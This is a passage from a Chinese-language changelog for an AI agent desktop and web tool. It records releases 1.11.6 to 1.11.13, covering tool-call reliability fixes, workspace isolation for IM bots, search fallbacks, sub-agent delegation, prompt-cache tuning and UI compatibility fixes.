# 更新日志 / Changelog

本项目遵循[语义化版本](https://semver.org/lang/zh-CN/)。日期为发布日期。

## [1.11.13] - 2026-10-18

**系统性提升工具调用成功率：参数同义名/类型归一、相对路径统一锚到会话工作副本、文件读取编码回退、终端链式命令自动换壳；修复隔离工作区里写文件被插件误判失败、产物写错目录（Web/IM 机器人工作区混淆）等高频问题；办公套件依赖确认齐备**

### 一、工具调用成功率（file_read / file_write / file_edit / terminal / pwsh 等全部工具）

- **参数同义名归一**：模型常把参数写成另一套命名习惯 —— `file_path`/`filename`→`path`、
  `cmd`→`command`、`cwd`→`workdir`、`limit`→`max_results`、`old`/`new`、`dest`→`output`、
  `database`/`db` 等。此前这些会被判成"参数名写错"或静默忽略，现在在分派入口
  直接改名为 schema 真名（仅在目标参数存在且未被同时传入时，避免误改）。
- **容器参数再序列化解析**：`"files": "['a.txt','b.txt']"`（Python 单引号）、
  外层 Markdown 代码围栏、`"timeout": "600"`、`"background": "true"` 等
  在分派前统一解析/转换，不再让一次调用因为"格式多包了一层"而白跑。
- **`file_read` 编码回退与路径纠错**：中文 Windows 上大量 txt/csv/md 是 GBK；
  此前默认 UTF-8 读取直接异常。现在按 请求编码 → UTF-8 → GB18030/GBK → latin-1
  依次回退，并在结果里回报实际编码；文件不存在时给出**同目录相近文件名**，
  传目录时提示改用 `file_search`/`terminal` 而不是干巴巴的 `IsADirectoryError`。
- **`file_write` 内容容错**：模型把 dict/list 直接当 `content` 传时自动序列化为
  JSON 文本；目标路径是目录时给出可操作提示。
- **`file_edit` 文本容错**：`old_string`/`new_string` 被传成数字/对象时先转文本，
  避免 `.count()` 直接抛类型错。
- **`terminal` 链式命令兜底（重要）**：旧逻辑只在**第一个**命令不被 cmd 识别时
  才换壳；`cd /d 项目 && echo ... && ls` 的失败点在第三段，永远不触发。现在：
  - 先尝试"只替换失败段"的 cmd 等价写法（`ls`→`dir`、`cat`→`type`、`grep`→`findstr`…），
    保留 `cd /d` 等 cmd 语义；
  - 替换不了且失败点之前的段都是只读命令时，自动改用 Git Bash / PowerShell 重跑；
  - 失败点之前出现过写操作（`rm`/`pip`/…）则不自动重跑，返回明确指引，避免重复副作用。
- **`pwsh` 输出解码**：中文 Windows 的 PowerShell 输出可能是 GBK；与 `terminal`
  共用一套解码回退，不再整屏 `�`；命令外层代码围栏自动剥离。
- **`present` 交付声明容错**：支持 `files` 为路径字符串、字符串列表、JSON/Python
  字面量列表、`{path, description}` 对象列表（及 `file_path` 别名），全失败才报错。

### 二、工作区与 IM 机器人工作区不再混淆

- **相对路径统一锚定（核心修复）**：此前只有 file_* 工具自己按 `_RootGuard` 解析
  相对路径，office / media / archive / db / csv / calendar 等工具直接按**服务进程
  cwd** 解析 —— Web 切到 A 项目、IM 机器人跑 B 项目时，产物实际写到 AutoMind 自己的
  目录，既找不到也混进别的会话。现在在分派入口把所有路径类参数（`path`/`output`/
  `sources`/`inputs`/`database`/`workdir`/`files[*].path`…）统一锚到**当前会话的
  隔离工作副本**（无隔离时锚到项目根），所有工具一致；`repo` 等少数参数固定用
  项目根（隔离副本不含 `.git`）。
- **写后自检插件按真实工作区回读**：`artifact_selfcheck` / `delivery_manifest`
  此前拿模型给的相对路径按服务 cwd 检查 —— 开启目录隔离（Web/IM 的工作模式默认
  开启）时，**每一次成功写文件都会被误判"文件不存在"**。现在优先用工具返回值里
  的解析后绝对路径，其次按会话副本/项目根解析；交付清单也记录真实绝对路径与大小。
- **`file_search` 只看自己的工作区**：会话隔离开启时以副本为根，不再把项目根下
  `.automind/workspaces/bot-*`（IM 机器人/其它会话的副本）当项目文件返回；`.automind`
  整体从搜索结果中隐藏，模型不会顺着读到别的会话工作区。
- **IM 机器人会话命名空间**：机器人会话固定 `bot-<id>-<chat-hash>[-generation]`，
  与浏览器会话（`s_*` / owner 前缀）完全隔离；会话 id 决定工作副本名，因此
  Web 与 IM 各自写自己的副本，`/apply` 也只作用于本项目。新增回归测试钉住
  「bot- 前缀、按聊天隔离、/new 换代、不同机器人不串」。

### 三、办公套件依赖

- 已执行 `automind doctor --fix` 并逐项导入验证：`openpyxl`、`python-docx`、
  `python-pptx`、`pypdf`、`icalendar`、`Pillow`、`matplotlib`、`psutil`、
  `pyperclip`、`pytesseract`、`mutagen`、`pywin32(win32com)` 全部就绪（已存在的
  不重复安装）；`ffmpeg`/`ffprobe`/`tesseract`/`git` 外部程序也在位。
- 办公/多媒体工具在隔离工作区里逐一实跑：Excel/Word/PPT 创建+读取、PDF 解析、
  CSV、压缩包、图片/图表/OCR、音视频信息与抽帧、数据库、日历全部成功，
  产物全部落在当前会话副本，**项目根与进程 cwd 均无散落文件**。

### 四、实测效果（同一 IM 机器人任务，修复前后）

| 指标 | 修复前 | 修复后 |
|---|---|---|
| `file_write` 成功 | ❌ 每次被自检误判"文件不存在" | ✅ 成功，产物在机器人自己的副本 |
| `terminal` 混合 shell 命令 | ❌ `ls`/`head` 一次失败一次重试 | ✅ 自动换壳/替换，直接成功 |
| `file_search` | ⚠ 返回 `.automind/workspaces/bot-*` 等其它工作区文件 | ✅ 仅本会话副本，目录干净 |
| 该任务工具失败次数 | 4 | 0（复测写 note.txt 任务失败 0） |

### 五、测试

- 新增 `tests/tools/test_tool_reliability_v1113.py`（20 条）：同义参数名、容器解析、
  路径锚定/多会话隔离、GBK 读取/相近文件提示/目录提示、插件自检在副本中通过且
  仍能发现真缺失、交付清单真实路径、终端链式换壳与安全前缀。
- `tests/server/test_bots.py` 新增机器人会话命名空间回归（1 条）。
- 既有 core/planning/tools/server 全量回归通过；`ruff check` 通过。

## [1.11.12] - 2026-10-17

**修复 `web_search` 开箱不可用：配置过 DeepSeek Key 即自动启用官方搜索 API，无 Key 也有免密钥检索兜底；补齐依赖自检对浏览器/MCP/ffprobe 的覆盖**

### `web_search` 为什么此前不可用

旧实现只认 `AUTOMIND_SEARCH_PROVIDER` + `AUTOMIND_SEARCH_API_KEY` 两个环境变量，
没配就返回「未配置搜索服务」。而 Tavily / Serper / Brave 都需要单独注册申请，
绝大多数用户不会为了一次搜索去开账号 —— 于是工具面板里它一直在，实际一调就失败。

### 修复：三层自动降级（不再要求用户先配搜索 Key）

1. **显式配置优先（向后兼容）**：`AUTOMIND_SEARCH_PROVIDER` 仍支持
   `tavily` / `serper` / `brave` / `searxng`；配置了就用，失败会记录原因并继续降级。
2. **DeepSeek 官方搜索 API（默认路径）**：只要用户在「设置 → API Keys」里配过
   DeepSeek（或设置了环境变量 `DEEPSEEK_API_KEY`），自动复用同一把 Key 调用
   `https://api.deepseek.com/v1/tools/search`（结构化 title/url/snippet/date，
   不消耗模型轮次，计费独立于模型 token）。可用 `DEEPSEEK_SEARCH_BASE_URL` 指向
   其它部署。
3. **免密钥网页检索兜底**：没有可用 Key 时，抓取 Bing 搜索结果页解析
   （`cn.bing.com` → `www.bing.com`），结果标注 `provider="bing"`、`keyless=true`，
   并提示结果质量可能受页面改版/人机验证影响。三层全失败才返回错误，且错误逐条
   说明各后端失败原因与修复办法，不再是「未配置搜索服务」这一句。

- 工具描述同步更新；`web_search` 的 `needs_config` 只在确实没有任何可用后端时出现。
- 新增 `tests/tools/test_web_search.py`（12 条，`httpx.MockTransport`，不联网）：
  DeepSeek 解析/清洗/空结果/401 降级、无 Key 走 Bing、全部失败话术、
  Tavily 旧路径兼容、Bing 跳转链接解码与解析去重。

### 其他工具的可用性审计与补齐

- **全量功能审计**：本机逐一实跑通过 —— 文件读写编辑搜索、`terminal` / `pwsh` /
  `python_sandbox`、`web_fetch` / `http_request` / `web_search`、`browser`（Playwright +
  系统 Edge 回退）、`screenshot_tool`、`process_tool`、`clipboard_tool`、`git_tool`、
  `db_query`、`csv_tool`、`archive`、`code_generate`、`calendar`、`notify`、
  `terminal_background`、图片/图表/OCR/音视频、Excel/Word/PPT/PDF、内置插件（8 个）
  与技能（12 个）。
- **修复 `file_multi_edit` 从未注册**：`FileMultiEditTool` 类在 v1.6 就实现了、文档与
  工具目录都提到它，但 `_register_default_tools` 的注册循环漏了它 —— 模型看不到、
  工具面板也没有，批量改多个文件只能逐个来。现已注册（与 file_read/write/edit 同一
  路径防护），并补了「注册 + 实际多文件编辑」回归测试。
- **依赖自检补强**（`automind doctor` / `python -m automind.core.dep_preflight`）：
  - 新增「浏览器 / MCP 扩展」分组：`playwright`、`mcp` 缺失时不再显示"全部通过"；
  - 外部程序检查补上 `ffprobe`（视频信息依赖它；此前只查 `ffmpeg`，缺 ffprobe 时
    `video_tool` 会在运行时才失败）；
  - 报告顺序与 `--fix` 安装范围同步覆盖新增分组。
- 需要外部配置的能力保持"明确失败 + 可照做提示"：`email_tool`（SMTP/IMAP 环境变量）、
  `im_integration`（群机器人 Webhook）、`pdf_tool` 水印/加密（专业版）等；
  这些不是缺陷，工具会给出具体配置项而不是假装成功。

### 测试

- 新增 `tests/tools/test_web_search.py`（12 条）；更新
  `tests/tools/test_new_tools.py`（旧「未配置搜索服务」断言改为新的降级失败断言）与
  `tests/core/test_dep_preflight.py`（extra 分组 + ffprobe 覆盖）。
- 全仓回归：新增相关套件全绿；`ruff check` 通过。

## [1.11.11] - 2026-10-17

**新增模型主动协作能力：待办清单 / 向用户提问 / 交付声明 / 原生 PowerShell；上下文溢出可压缩重试；专业版新增子智能体委派 MVP。全部为增量补充，不改既有执行逻辑**

### 社区版：4 个模型可主动使用的新工具

- **📋 `todo_write`（待办清单）**：多步任务里维护一份用户可见的短清单（pending / in_progress / completed），整表替换、最多 50 条、按**会话**持久化。与「计划树」分工：计划是执行前生成、按步推进；待办是任务中途随时可改的工作清单。右栏「📋 待办」实时显示，可一键清空（`GET/DELETE /api/todo`）。
- **❓ `ask_user_question`（向用户提问）**：模型可带选项/多选/自定义输入地问用户，然后**等待回答**。复用审批的等待模式（进程内 Future + WS 回答），超时**绝不当作同意**；子智能体无回答界面，工具层直接拒绝。前端新增提问弹窗（倒计时、选项、自定义），经典兜底界面同步。
- **📎 `present`（交付声明）**：模型显式声明"这些是最终交付物"（只记路径与说明，不读/不复制内容），聊天区渲染成可点开的交付卡片。与内置插件 `delivery_manifest`（自动记账）互补；路径限定在项目目录或会话工作副本内。
- **🪟 `pwsh`（原生 PowerShell，仅 Windows 注册）**：`terminal` 在 Windows 上默认走 cmd、对 Unix 写法做换壳兜底，但模型写 `$env:`/`Get-ChildItem` 这类原生 PowerShell 会失败。新工具按 PowerShell 语义执行、超时杀进程树、输出体积受既有上限约束。

### 上下文压缩补强（社区版，core）

- **窗口压力触发**：此前压缩只看"任务累计 token 预算"（默认 50 万 × 80%），一个每步 prompt 都很大的任务可能先撞模型上下文窗口而失败。现在单次请求输入达到「短期记忆上限」的 80%（`context_compact_ratio`，可配）就主动压一次；压过后要再涨 5% 窗口才压第二次，避免每轮重置前缀缓存。
- **溢出恢复**：ReAct 捕获 `LLMContextTooLargeError` 后折叠旧观察并**只重试一次**；对话模式在尚未输出任何内容时裁掉一半历史重试（已输出则如实报错，避免同一段内容显示两遍）。仍失败则走既有"部分交付清单"，不再整轮作废。
- **手动 `/compact`**：Web 输入框指令与 CLI TUI 新增 `/compact`，调用 `force_compact()` 并回显折叠条数/回收字符/估算节省 token；WS 新增 `compact` 动作（不新增 HTTP 路由）。

### 专业版：子智能体委派 MVP（`multi_agent` 特性门控）

- **4 个工具**：`subagent`（一次性派发，立即返回 id）、`subagent_list`（状态/步数/token/输出尾部）、`subagent_send`（追加要求，排队等子任务步骤边界）、`subagent_stop`（取消，幂等）。
- **运行方式**：复用 `clone_for_session()` 派生执行态独立的子 Agent，只跑受限 ReAct（工具白名单 + 步数/token 预算），不做计划/质量评估/反思；默认只给**只读 SAFE** 工具，写盘/执行命令必须显式列入白名单；子任务在独立 session 上下文里绑定「当前 Agent=子 Agent、深度=父级+1」。
- **硬边界**：每会话并发 ≤4、嵌套深度 ≤1（子智能体不能再派）、保留最近 20 条结果（运行中不清理）、输出截断后进父上下文；子任务异常/取消收敛成终态事件，绝不拖垮父任务。
- **界面**：右栏新增「🤖 子智能体」区块（仅专业版显示），事件流实时更新标题/状态/步数/token/输出尾部。
- 说明：`subagent_fork`（以父对话为初始内容的 fork）与可续跑子智能体留待后续版本；社区版不注册这些工具。

### 事件与接口（全部为新增，旧客户端忽略即可）

- WS 新增事件：`todo_updated`、`user_question` / `user_question_resolved` / `user_question_stale`、`presented_files`、`compact_result`、`context_pressure`、`subagent_started` / `subagent_update` / `subagent_done`；新增客户端动作 `user_answer`、`compact`。
- 新增 `GET/DELETE /api/todo`（路由快照已显式登记）；其余全部走既有 WS 通道，未新增其它路由。
- 任务历史/统计/缓存命中率/观测中心等既有行为不变；新增工具独立注册，单个加载失败只记账、不影响其它工具与启动。

### 测试

- 新增 `tests/core/test_supplement_tools.py`（24 条）：待办存储/工具/会话隔离、提问登记/回答/超时/无通道、交付路径边界、pwsh、工具注册与失败隔离。
- 新增 `tests/core/test_context_compaction.py`（8 条）：窗口压力阈值与防抖、`force_compact` 账目、ReAct 溢出只重试一次、对话裁剪。
- 新增 `tests/planning/test_subagents.py`（50 条）与 `tests/planning/test_subagent_integration.py`（3 条）：管理器全路径 + 真实 `run_subtask` 的 agent/深度绑定与默认只读工具。
- 新增 `tests/server/test_v1111_interactions.py`（23 条）与 `tests/server/test_v1111_ui.py`（30 条）：todo 端点、WS 回答/压缩、路由快照、源码 + 构建产物的界面结构断言。
- 既有测试全量回归通过（含缓存命中率、长任务守卫、克隆属性对齐等）。

## [1.11.10] - 2026-10-17

**右栏新增实时「缓存命中率 / 上下文使用率」；修正三处会让提示前缀缓存整段失效的写法，DeepSeek / GLM 等模型的自动缓存命中率显著提升**

### 右栏：缓存命中率与上下文使用率（实时）

- **⚡ 缓存命中率**：每次模型调用结束即更新，显示「命中 tokens / 输入 tokens」与「命中次数 / 调用次数」；模型不返回缓存字段（如 Ollama、部分中转）时显示 **「—」**，而 0% 只表示"确实没命中"，不拿 0 冒充满分失败。
- **🧠 上下文使用率**：按「最近一次请求的输入 tokens ÷ 短期记忆上限」计算并画进度条，≥70% 黄色、≥90% 红色。取的是**单次请求峰值**而不是累计输入 —— 累计值会随步数线性增长，永远看起来"快溢出了"。
- 右栏「🧭 摘要」头部同步显示 `⚡ 缓存 xx% · 🧠 上下文 xx%`；经典兜底界面（`/legacy`）同步补齐两项指标与进度条。
- 缓存用量覆盖四类口径：DeepSeek（`prompt_cache_hit_tokens` / `prompt_cache_miss_tokens`）、GLM(智谱)/OpenAI/Kimi/通义/豆包（`prompt_tokens_details.cached_tokens`，兜底顶层 `cached_tokens`）、Anthropic（`cache_read_input_tokens` + `cache_creation_input_tokens`，其 `input_tokens` 不含缓存读取，总输入已修正）、Gemini（`cached_content_token_count`）。流式 `STREAM_USAGE` 标记同步携带这些字段。

### 缓存命中率优化（DeepSeek / GLM 等自动前缀缓存）

- **对话历史改"格点裁剪"**（新模块 `automind/core/chat_window.py`）：此前每轮都发 `hist[-20:]`，历史超过 20 条后**每轮从头部丢 1 条**，前缀每轮都变，缓存整段失效。现在窗口起点按 6 条为粒度前跳，连续约 3 轮共享同一前缀；服务端"知识库片段是否已可见"的判定改用同一个窗口函数，避免两套窗口漂移造成漏注入。
- **ReAct 工具目录只追加、不改写**：工具集扩充时不再改写第 2 条 system 消息，改为在尾部追加一条「工具目录更新」。中段任务的前缀不再被整段作废。
- **易变记忆移出稳定前缀**：`[Relevant Memories]` 从 `Environment:` 消息中拆出，作为环境之后的独立 system 消息；「系统提示 → 工具目录 → 环境」这段前缀可跨任务复用。
- **压缩不再白花一次模型调用**：ReAct 正在跑且没有可折叠内容时，不再退回 ContextManager 摘要压缩 —— 那份流水账从未进过请求体，摘要一个 token 也省不到，还会多出一次 0% 命中的一次性提示。折叠事件新增 `cache_reset` 标记，命中率骤降时能一眼看出是压缩导致。
- **用量口径修正**：对话流式改用提供商回传的真实 usage（含缓存），不再只给本地估算；`usage_update` 的累计值按任务清零（此前是会话克隆生命周期累计，右栏「本次」与任务语义对不上）。

### 兼容与观测

- `GET /api/tokens` 在原 4 个字段之外新增 `cached` / `input` / `calls` / `cache_hit_calls` / `cache_rate` / `context{used,max,pct}`；`DELETE /api/tokens` 一并清零；`/api/stats` 的 `tokens_session` 与历史聚合共用同一口径。**未新增 HTTP 路由**。
- `/metrics` 新增 `automind_cache_hit_ratio` 指标；重放记录的脱敏白名单放行缓存用量字段（`prompt_cache_hit_tokens` 等名字里带 "token"，不豁免会被当成密钥抹成 `***`）。
- 任务历史记录新增 `cached_tokens` / `input_tokens` / `llm_calls` / `cache_hit_calls` / `cache_reported_calls` / `peak_prompt_tokens`（旧记录缺省按 0，向后兼容）。

### 测试

- 新增 `tests/core/test_prompt_cache_metrics.py`（23 条）：五类提供商缓存口径归一化、流式标记、`usage_sink` 透传、`TokenUsage` 累计与"不上报缓存 = None"、agent 事件端的命中率/上下文峰值。
- 新增 `tests/planning/test_prompt_cache_stability.py`（14 条）：工具目录只追加、初始消息顺序、格点窗口与相邻轮次前缀关系、ReAct 在跑时不再付费摘要。
- 新增 `tests/server/test_token_cache_stats.py`（20 条）与 `tests/server/test_v11110_cache_panel.py`（21 条）：服务端聚合/清零/空值语义，以及源码 + 构建产物的右栏结构断言。

## [1.11.9] - 2026-10-17

**交付链四件套内置安装（交付清单 / 任务通知 / 产物自检 / 文件占用重试）+ 依赖自检 `automind doctor`；修复两个会让工具被重复执行的重试/重放风暴**

### 交付链：4 个新内置插件（随包分发、默认开启）

- **📦 delivery_manifest（交付清单）**：按任务记录实际写入的文件（路径 / 大小 / SHA-256 指纹 / 写入方式），任务收尾时把清单追加进回复、并尽力落一份 markdown 到数据目录。
  清单来自**工具调用记录**而非模型自述——"到底改了哪几个文件"第一次有了程序化来源。
- **✅ artifact_selfcheck（产物自检）**：写文件 / 存 Office / 导出 PDF 图片之后**立刻回读磁盘**——存在、非空、xlsx/docx/pptx/pdf/图片能重新打开；不合格当场把这次调用改判失败并给出修法，让模型在下一步修而不是把坏文件当交付。
  缺解析库时跳过该项检查，绝不因缺库误判失败。
- **🔒 fs_lock_guard（文件占用重试）**：Excel/WPS/看图软件/同步盘占用文件时（`WinError 32/5`、`EBUSY`、`database is locked`，中英文都认）按 0/0.4/1.2 秒退避重试，重试用尽给出可操作提示（关闭占用程序或换文件名）。`file_read` 也纳入重试。
- **🔔 task_notify（任务通知）**：任务结束写本地通知日志（`~/.automind/notifications.log`）；设置 `AUTOMIND_NOTIFY_WEBHOOK` 后以 JSON 推送到任意接收方（企业微信 / 钉钉 / Slack 机器人只需一个 URL）。
- 升级即生效：老配置升级后这 4 个插件自动启用（`known_plugins` 机制，v1.11.6 引入），仍可在「插件」页随时停用。

### 修复：两个"工具被重复执行"的风暴

- **重试风暴（文件锁双重重试）**：v1.11.7 起 `net_resilience`（core，0.5/1/2s）与 `fs_lock_guard`（插件，0/0.4/1.2s）**同时在**对文件占用做退避重试——同一次写占用最坏执行 **12 次、干等约 12 秒**。现在锁重试整体移交 `fs_lock_guard`（分派链更内层），core 只管网络，单一职责。
- **重放风暴（中间件异常重放）**：`ToolRegistry` 的中间件异常兜底此前无条件"跳过本层、重跑下一层"——
  · 工具自己抛异常时，异常会穿过**每一个**外层中间件帧的 except，各帧再各重放一遍：4 个中间件插件时一个抛异常的工具会执行 3 次；
  · 中间件在工具**成功之后**做后处理（记账 / 校验 / 换结果）时抛异常，旧代码同样把整条链重跑——写盘类操作被二次执行。
  现在用 `tool_ran` 标记：工具一旦开始执行，任何一层再抛异常都**不再重放**，合成一条"结果未知，请先用只读工具核对"的失败结果交回模型（保留 `describe_tool_error` 的参数提示）。
- **中间件顺序不再由字母序决定**：`plugin.json` 新增可选 `priority` 字段（数字越小越外层，默认 100；非法值回退）。交付链固定为 delivery_manifest(10) → artifact_selfcheck(20) → fs_lock_guard(30) → net_resilience(40)——外层（记录清单）看到的始终是内层（重试 / 校验）处理完的最终结果。生命周期钩子同样按 priority 合并。

### 依赖开箱自检（`automind doctor`）

- 新模块 `automind/core/dep_preflight.py`：一次看清**核心依赖 / Web·机器人 / 办公多媒体（可选）/ 外部程序（ffmpeg、tesseract、git）/ 内置插件**五类就绪状态，缺口带可照抄的安装命令（外部程序给的是 winget/brew/apt 办法，不是一句 pip）。
- `automind doctor`：全量自检报告；`automind doctor --fix` 一键补齐缺失的 **Python 库**（默认走清华镜像，`AUTOMIND_NET_MIRROR=0` 直连）；`--json` 供脚本消费。
- Web 服务器启动横幅下新增一行缺口提示（不阻断启动）；`launch.bat` 新增选项 [5] 依赖自检、[6] 自检 + 一键补齐。
- 检测用 `importlib.util.find_spec`（只定位、不执行包代码），秒级完成；插件检查只做"清单可解析 + 入口在 + 语法能编译"，不执行插件代码。

### 测试

- 新增 `tests/core/test_builtin_delivery_chain.py`（28 条）：交付链优先级嵌套顺序、非法 priority 回退、重放风暴三形态（工具异常 / 后处理异常 / 取消传播）、fs_lock_guard 重试与放弃话术、artifact_selfcheck 五种校验路径（缺库跳过 / 坏文件改判 / 非写类工具不动）、delivery_manifest 记录与清零、task_notify 本地日志与"未配 webhook 不发请求"。
- 新增 `tests/core/test_dep_preflight.py`（7 条）：检查项分组完整、模块名↔包名映射、缺口必带修法、ensure_missing 无缺口零动作、--json 输出口径稳定。
- 既有用例随行为更新：v1.11.7 的三条文件锁用例改为"core 不再重试 + 插件重试"两半；`test_builtin_plugins.py` 的内置集合扩到 8 个、升级路径断言 4 个新插件默认开启、"挂了钩子"的判定放宽为"钩子 / 工具 / 中间件三者有其一"。

## [1.11.8] - 2026-10-16

**修复部分电脑上会话「⋯」、设置里的下拉框（审批超时处置 / 并发写冲突策略）点了没反应；全面增强界面兼容性**

### 根因 / 修复

- **真正的根因：动画帧停摆**。antd 的下拉菜单、下拉选择框、确认气泡、弹窗都由 rc-motion 驱动出场动画，
  它靠 `requestAnimationFrame` 推进 `appear-prepare → start → active`。部分电脑上页面明明可见，rAF 却一帧都不来
  （窗口被遮挡、显卡加速异常、部分 WebView2 / 远程桌面环境），弹层就永远停在 `ant-slide-up-appear-prepare`、
  `opacity: 0` —— 看起来就是"点了没反应"。这不只是旧内核问题，所以 v1.11.4 只在旧内核关动画没覆盖到。
  复现：在一个"可见但 500ms 内 rAF 0 帧"的页面里点会话「⋯」，弹层类名停在 `ant-slide-up-appear-prepare`，透明度为 0。
- **启动时探测 rAF**（`lib/popupGuard.detectRafStall`，窗口重新可见时再测一次）：停摆就关闭 antd 动画
  （`token.motion = false`），弹层不再依赖 rAF，直接显示。同样的环境下修复后：「⋯」菜单、设置菜单、
  「审批超时处置」下拉均直接出现（opacity 1），不需要任何兜底。「减少动效」偏好现在也会关闭 antd 动画。
- **第二道防线推广到所有弹层**：v1.11.4 的"打开后自检可见性，看不见就换兼容控件"此前只用在「＋」「设置」两处。
  现在共用 `lib/popupGuard`，并覆盖：
  - 会话行「⋯」菜单（此前是裸 antd Dropdown，没有任何兜底）→ 走 `SafeDropdown`；
  - 全部 17 处下拉选择框 → 新组件 `SafeSelect`：兼容路径是**浏览器原生 `<select>`**（选项列表由系统绘制，
    与页面 CSS / 动画无关，任何内核都能弹出），支持分组选项、禁用项、数字值；
  - 3 处删除确认气泡 → 新组件 `SafePopconfirm`：兼容路径是浏览器原生确认框；
  - 自检现在也识别"点了根本没打开"（点击被吞掉），不只是"打开了却看不见"；任何一个控件自检失败，
    同页所有同类控件一起切到兼容模式并记住。
- **兼容菜单跑出屏幕**：右对齐的兼容菜单此前按固定 300px 宽计算，侧栏会话的「⋯」会伸出屏幕左侧 77px；
  现在按菜单实际宽度夹进视口，会话菜单收窄为 200px。
- **兼容菜单的点击冒泡**：兼容菜单经 portal 渲染到 body，但 React 合成事件仍冒泡回会话行（点"重命名"会顺带切换会话）；
  现在在菜单根上截住。
- **界面开关**：通用设置 → 界面偏好新增「兼容控件模式」—— 桌面版没有地址栏、没法加 `?menu=simple`，
  现在可以直接勾选（切换后自动刷新）。`?menu=simple` / `?menu=antd` 仍可用。

### 界面

- 设置菜单里机器人入口改为「🤖 机器人（飞书 / 钉钉 / 企微）」。

## [1.11.7] - 2026-10-16

**机器人改用长连接：本地 / 云电脑部署不需要公网地址即可连飞书、钉钉、企业微信；一个文件完成专业版 / 企业版升级；长任务与工具调用稳定性增强**

### IM 机器人：长连接接入（`automind/bots/longconn.py`，详见 `docs/IM_BOTS.md`）

- **根因**：v1.11.6 的机器人只支持回调模式，需要平台从公网访问本机。本地电脑与大多数云电脑没有公网 IP，
  必须再配内网穿透、域名、证书、可信 IP，任何一环断了就收不到消息。
- **长连接**：由本机**主动**连到平台（出站 WebSocket），只要能上网就能收发消息，NAT / 防火墙 / 无公网 IP 都不影响：
  - **飞书**：`POST /callback/ws/endpoint` 取地址 → WebSocket；帧为 protobuf（`pbbp2.Frame`，内置最小编解码，
    不依赖飞书 SDK），支持分片消息合并、应用层 ping、逐条 ACK（带 `biz_rt`）；
  - **钉钉**：Stream 模式，`POST /v1.0/gateway/connections/open` 注册 → WebSocket；JSON 帧，SYSTEM ping 原样回显、
    `disconnect` 立即重连、机器人消息逐条 ACK，回复仍走消息里的 sessionWebhook；
  - **企业微信智能机器人**（新渠道 `wecom_bot`）：`wss://openws.work.weixin.qq.com`，`aibot_subscribe` 鉴权、30 秒心跳，
    第一条回复用 `aibot_respond_msg`（流式、finish），之后用 `aibot_send_msg` 主动推送 —— 不需要公网地址，也不需要配置企业可信 IP。
- 飞书 / 钉钉默认改为长连接（仍可在设置里切回 HTTP 回调）；断线按 1s → 60s 指数退避无限重连；连上过一阵再断的从 1 秒重新开始。
- 设置页新增「📡 接收方式」切换与「🔌 连接状态」（已连接 / 重连中 + 失败原因 + 最近消息时间 + 立即重连），每 3 秒刷新；
  配置步骤按接收方式分别给出（例如飞书要求**先**有客户端连上才允许保存"长连接"订阅方式）。
- 新接口 `POST /api/bots/{id}/reconnect`；服务启动时自动建立全部长连接（`AUTOMIND_BOTS_AUTOSTART=0` 可关闭，测试默认关闭）。
- 依赖：`web` / `full` 额外依赖加入 `websockets>=12.0`；桌面版打包显式收集 `websockets`。

### 专业版 / 企业版：一键升级包（详见 `docs/UPGRADE_GUIDE.md`）

- **发行方一条命令出包**：`python pro/tools/issue_license.py bundle PRO 20271231 acme` →
  `dist/upgrades/AutoMind-PRO-acme-20271231.ampkg`（扩展包 wheel + 许可证 + 清单打在一个文件里）。
  出包前用内置公钥自检：私钥与公钥不是一对时拒绝出包，不会发出一个激活不了的升级包；没有现成 wheel 时现场构建。
- **客户拖一个文件**：升级面板新增「⚡ 一键升级」，拖入 `.ampkg` 自动装包 + 激活，无需重启；
  已激活时显示「🔁 续期 / 升级到更高版本」，续期、专业版升企业版、扩展包更新都是再拖一个新包。
  进程里已加载旧版扩展时，许可证先落盘、提示重启一次后生效。
- `POST /api/license/package` 同时接受 `.ampkg` 与 `.whl`（`edition.install_upgrade`）。
- ⚠️ 当前 `pro/automind_pro/licensing/keys.py` 的验签公钥仍是占位符：发行方需按升级方案第一节做一次 keygen 并构建扩展包，
  否则任何许可证都无法激活。

### 长任务稳定性

- **步数窗口续加**：ReAct 步数用完但最近几轮仍有工具调用成功（任务在推进）时，自动续加一个步数窗口（最多 2 次），
  并提示模型先完成未交付的部分、不要重复已做的步骤；没在推进的照旧收尾并给出部分交付清单。
- **断网等待**：模型连接的任务层重连（约 100 秒）用完后，先探测本机网络；确认是本机断网就等网络恢复
  （单次最长 10 分钟、最多 2 次，且不超过整轮时长预算）再继续，而不是让做了一半的长任务作废。
  界面显示「📶 本机网络断开，等待恢复后继续」。

### 工具调用稳定性

- **terminal：Windows 上自动换壳**：cmd.exe 不认识 `ls` / `cat` / `mkdir -p` / `rm -rf` / `head` / `which` 这类
  Unix 命令时（且是第一个命令就不认识，即什么都还没执行），自动改用 Git Bash 重跑；没有 Git Bash 时把常见写法
  译成 PowerShell。结果里注明换了什么壳。
- **terminal：输出解码**：先按 UTF-8，失败再按系统代码页（中文 Windows = GBK）。此前中文报错解出来满屏乱码，模型只能瞎猜。
- **file_edit：容错匹配**：old_string 精确匹配不到时，按"忽略行尾空白"、"忽略缩进差异"再找一次，唯一命中才替换
  （并把 new_string 平移到文件里的实际缩进），多处命中仍照旧报错；GBK 文件按 GBK 读写，不会被悄悄改成 UTF-8。
- **文件被占用自动重试**：文件写入 / 编辑 / 读取、CSV、压缩、数据库遇到「另一个程序正在使用此文件」「database is locked」
  时按 0.5s / 1s / 2s 重试，仍不行给出可操作的提示（关闭占用该文件的程序）。

### 测试

- `tests/server/test_bot_longconn.py`（8）：用本地 WebSocket 服务模拟三家平台 —— 飞书分片消息合并与 ACK、
  钉钉 ping 回显 / 消息 ACK / disconnect、企业微信鉴权 / 收消息 / 回复帧、鉴权失败、断线退避重连与停止。
- `pro/tests/test_issue_bundle.py`、`pro/tests/test_in_app_upgrade.py`（+4）：出包 → 拖入 → 激活全链路、
  公钥不匹配拒绝出包、坏许可证报原因、需重启时许可证先落盘。
- `tests/core/test_v1117_reliability.py`（19）：输出解码、Unix → PowerShell 翻译、换壳只在第一个命令不认识时发生、
  文件锁重试、断网等待 / 网络正常时不等、步数续加条件。
- 既有用例随行为调整：缩进写错的 file_edit 现在会被改对（原用例断言失败）、步数用完仍推进时会续加（部分交付用例显式关闭续加）。

## [1.11.6] - 2026-10-15

**设置里新增「🤖 机器人」：在飞书 / 钉钉 / 企业微信 / 微信里下达任务，过程与结果回传聊天窗口；网络中断不再让工具"连续失败 3 次被熔断"；隔离副本产物按相对路径覆盖回项目根**

### 新功能：IM 机器人（`automind/bots/`）

- **五个渠道**：飞书（事件订阅，支持 Encrypt Key 解密与请求签名校验、事件去重）、钉钉（企业内部机器人 HTTP 模式，
